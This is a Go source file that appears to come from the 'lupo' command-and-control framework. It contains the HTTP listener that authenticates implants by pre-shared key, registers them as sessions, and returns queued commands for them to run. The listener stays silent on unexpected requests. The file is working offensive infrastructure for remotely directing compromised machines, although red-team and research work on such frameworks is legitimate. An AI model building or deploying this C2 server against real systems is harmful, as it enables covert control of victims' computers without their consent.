package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"

	"github.com/google/uuid"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/core"
	"github.com/fatih/color"
)

// Define custom colors for text output
var errorColorUnderline = color.New(color.FgRed).Add(color.Underline)
var errorColorBold = color.New(color.FgRed).Add(color.Bold)
var successColorBold = color.New(color.FgGreen).Add(color.Bold)

// PSK - Pre-shared key for implant authentication
var PSK string

// HTTPServerHandler - Handles HTTPServer requests
func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {

	// Path variable if we need it, currently unused
	//path := r.URL.Path[1:]

	// Get the Remote Address of the Implant from the request
	remoteAddr := r.RemoteAddr

	// Setup webserver attributes like headers and response information
	w.Header().Set("Content-Type", "application/json")

	switch r.Method {
	case "GET":

		// Construct variables for GET URL paramaters
		getParams := r.URL.Query()
		var getPSK string
		var getSessionID int
		var getUUID uuid.UUID
		var getImplantArch string
		var getAdditionalFunctions string
		var register bool
		var err error

		// Check GET URL parameters and handle errors
		if len(getParams["psk"]) > 0 {
			getPSK = getParams["psk"][0]
		} else {
			returnErr := errors.New("http GET Request did not provide PSK, request ignored")
			ErrorHandler(returnErr)
			return
		}

		if len(getParams["register"]) > 0 {
			register, err = strconv.ParseBool(getParams["register"][0])
			if err != nil {
				returnErr := errors.New("http GET Request to register implant was not a valid Boolean, request ignored")
				ErrorHandler(returnErr)
				return
			}
		}

		if len(getParams["sessionID"]) > 0 {
			getSessionID, err = strconv.Atoi(getParams["sessionID"][0])
			if err != nil {
				returnErr := errors.New("http GET Request session ID was not a valid number, request ignored")
				ErrorHandler(returnErr)
				return
			}
		} else {
			getSessionID = -1
		}

		if len(getParams["UUID"]) > 0 {
			getUUID, err = uuid.Parse(getParams["UUID"][0])
			if err != nil {
				returnErr := errors.New("http GET Request UUID was not a UUID, request ignored")
				ErrorHandler(returnErr)
				return
			}
		} else {
			getUUID = core.ZeroedUUID
		}

		if len(getParams["arch"]) > 0 {
			getImplantArch = getParams["arch"][0]
		} else {
			getImplantArch = r.UserAgent()
		}

		if len(getParams["functions"]) > 0 {
			getAdditionalFunctions = getParams["functions"][0]
		} else {
			getAdditionalFunctions = ""
		}

		if getPSK == PSK {

			if register == true {

				implant := core.RegisterImplant(getImplantArch, getAdditionalFunctions)

				core.RegisterSession(core.SessionID, "HTTP", implant, remoteAddr)

				newSession := core.SessionID - 1

				response := map[string]interface{}{
					"sessionID": newSession,
					"UUID":      implant.ID,
				}

				json.NewEncoder(w).Encode(response)

				successColorBold.Println("\nNew implant registered successfully!")
				fmt.Println("Session: " + strconv.Itoa(newSession) + " opened")

				return

			}
		} else {
			returnErr := errors.New("http GET Request Invalid PSK, request ignored")
			ErrorHandler(returnErr)
			return
		}

		if core.Sessions[getSessionID].Implant.ID != getUUID || getUUID == core.ZeroedUUID {
			returnErr := errors.New("http GET Request Invalid UUID, request ignored")
			ErrorHandler(returnErr)
			return
		}

		cmd := core.Sessions[getSessionID].Implant.Command

		response := map[string]interface{}{
			"cmd": cmd,
		}

		json.NewEncoder(w).Encode(response)

		var sessionUpdate = core.Sessions[getSessionID]

		sessionUpdate.Implant.Command = ""

		core.Sessions[getSessionID] = sessionUpdate

	case "POST":

		r.ParseForm()
		// Construct variables for POST Data paramaters
		postParams := r.Form
		var postPSK string
		var postSessionID int
		var postUUID uuid.UUID
		var postImplantArch string
		var postAdditionalFunctions string
		var register bool
		var err error

		// Check POST Data parameters and handle errors
		if len(postParams["psk"]) > 0 {
			postPSK = postParams["psk"][0]
		} else {
			returnErr := errors.New("http POST Request did not provide PSK, request ignored")
			ErrorHandler(returnErr)
			return
		}

		if len(postParams["register"]) > 0 {
			register, err = strconv.ParseBool(postParams["register"][0])
			if err != nil {
				returnErr := errors.New("http POST Request to register implant was not a valid Boolean, request ignored")
				ErrorHandler(returnErr)
				return
			}
		}

		if len(postParams["sessionID"]) > 0 {
			postSessionID, err = strconv.Atoi(postParams["sessionID"][0])
			if err != nil {
				returnErr := errors.New("http POST Request session ID was not a valid number, request ignored")
				ErrorHandler(returnErr)
				return
			}
		} else {
			postSessionID = -1
		}

		if len(postParams["UUID"]) > 0 {
			postUUID, err = uuid.Parse(postParams["UUID"][0])
			if err != nil {
				returnErr := errors.New("http POST Request UUID was not a UUID, request ignored")
				ErrorHandler(returnErr)
				return
			}
		} else {
			postUUID = core.ZeroedUUID
		}

		if len(postParams["arch"]) > 0 {
			postImplantArch = postParams["arch"][0]
		} else {
			postImplantArch = r.UserAgent()
		}

		if len(postParams["functions"]) > 0 {
			postAdditionalFunctions = postParams["functions"][0]
		} else {
			postAdditionalFunctions = ""
		}

		if postPSK == PSK {

			if register == true {

				implant := core.RegisterImplant(postImplantArch, postAdditionalFunctions)

				core.RegisterSession(core.SessionID, "HTTP", implant, remoteAddr)

				newSession := core.SessionID - 1

				response := map[string]interface{}{
					"sessionID": newSession,
					"UUID":      implant.ID,
				}

				json.NewEncoder(w).Encode(response)

				successColorBold.Println("\nNew implant registered successfully!")
				fmt.Println("Session: " + strconv.Itoa(newSession) + " opened")

				return

			}
		} else {
			returnErr := errors.New("http POST Request Invalid PSK, request ignored")
			ErrorHandler(returnErr)
			return
		}

		if core.Sessions[postSessionID].Implant.ID != postUUID || postUUID == core.ZeroedUUID {
			returnErr := errors.New("http POST Request Invalid UUID, request ignored")
			ErrorHandler(returnErr)
			return
		}
		cmd := core.Sessions[postSessionID].Implant.Command

		response := map[string]interface{}{
			"cmd": cmd,
		}

		json.NewEncoder(w).Encode(response)

		var sessionUpdate = core.Sessions[postSessionID]

		sessionUpdate.Implant.Command = ""

		core.Sessions[postSessionID] = sessionUpdate

	default:
		// Invalid request type, stay silent don't respond to anything that isn't pre-defined
		return
	}

	return
}
